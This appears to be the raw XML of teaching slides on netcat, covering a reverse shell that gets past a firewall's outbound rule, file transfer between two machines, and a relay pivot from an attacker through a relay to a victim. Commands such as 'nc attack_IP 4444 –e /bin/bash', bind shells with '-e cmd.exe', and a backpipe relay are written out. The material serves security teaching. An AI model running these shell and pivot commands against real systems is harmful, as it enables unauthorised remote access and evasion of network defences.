              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –lvp 4444</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Google Shape;190;p1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pic>
        <p:nvPicPr>
          <p:cNvPr id="191" name="Google Shape;191;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2861398" y="1378559"/>
            <a:ext cx="4680745" cy="1969372"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="192" name="Google Shape;192;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="609598" y="5515550"/>
            <a:ext cx="755970" cy="774259"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="193" name="Google Shape;193;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3478365" y="5323510"/>
            <a:ext cx="438950" cy="1097375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="194" name="Google Shape;194;p10"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5603354" y="5454585"/>
            <a:ext cx="402371" cy="835224"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="195" name="Google Shape;195;p10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1393371" y="5778457"/>
            <a:ext cx="2084993" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:miter lim="800000"/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="196" name="Google Shape;196;p10"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1365568" y="6041363"/>
            <a:ext cx="4237786" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:miter lim="800000"/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="med" w="med" type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="197" name="Google Shape;197;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3904193" y="6330142"/>
            <a:ext cx="1297577" cy="507831"/>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Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Blocks inbound, allows outbound port 4444</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="198" name="Google Shape;198;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696686" y="6223925"/>
            <a:ext cx="1602377" cy="507831"/>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lang="en-US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>nc –lvp 4444</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="9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US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Type commands here!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;199;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5096617" y="4595523"/>
            <a:ext cx="1968137" cy="784830"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt1"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:schemeClr val="accent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900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Protected Server</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="9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US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>nc attack_IP 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Commands executed here!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="200" name="Google Shape;200;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3283131" y="5625737"/>
            <a:ext cx="195233" cy="330926"/>
          </a:xfrm>
          <a:prstGeom prst="irregularSeal2">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="42719B"/>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1"/>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Moving Files Using Netcat</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Google Shape;206;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="2160590"/>
            <a:ext cx="6347714" cy="424589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000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Machine 1 (IP: 192.168.20.9)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc –lvp 1234 &gt; /tmp/netcatfile</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Machine 2</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t># nc 192.168.20.9 1234 &lt; /tmp/myfile</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-44450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>You’ve used netcat to transfer the file from Machine 2 to Machine 1 ☺</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-44450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>How can we transfer the file from Machine 1 to Machine 2?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p1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2"/>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Netcat Relay Case #1: Listener-Client Relay on Linux</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="213" name="Google Shape;213;p12"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402620" y="2394782"/>
            <a:ext cx="6338760" cy="3213024"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="214" name="Google Shape;214;p12"/>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Netcat Relay Case #1 – cont'd</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="1829201"/>
            <a:ext cx="8232844" cy="4771624"/>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latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Attacker machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ nc –nv R</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>elay's_IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t> 2222</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Relay</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ mknod backpipe p</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ nc -l -p 2222 0&lt;backpipe | nc Victim's_IP 4444 1&gt;backpipe</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Victim machine</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>C:\&gt; nc -l -p 4444 -e cmd.exe</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buChar char="❖"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>$ nc –l –p 4444 –e /bin/bash</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-57150" lvl="1" marL="514350" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Noto Sans Symbols"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-171450" lvl="0" marL="171450" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="90C226"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Comic Sans MS"/>
                <a:ea typeface="Comic Sans MS"/>
                <a:cs typeface="Comic Sans MS"/>
                <a:sym typeface="Comic Sans MS"/>
              </a:rPr>
              <a:t>Note that you don’t need to have root privileges to set up a relay on Linux box as long as you are using ports greater than 1023 (because you need root in order to listen on a port less than 1024). On a Windows box, any port can be used without admin privileges</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="1" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Comic Sans MS"/>
              <a:ea typeface="Comic Sans MS"/>
              <a:cs typeface="Comic Sans MS"/>
              <a:sym typeface="Comic Sans MS"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="221" name="Google Shape;221;p1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14"/>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Listener-Client Relay in Picture</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
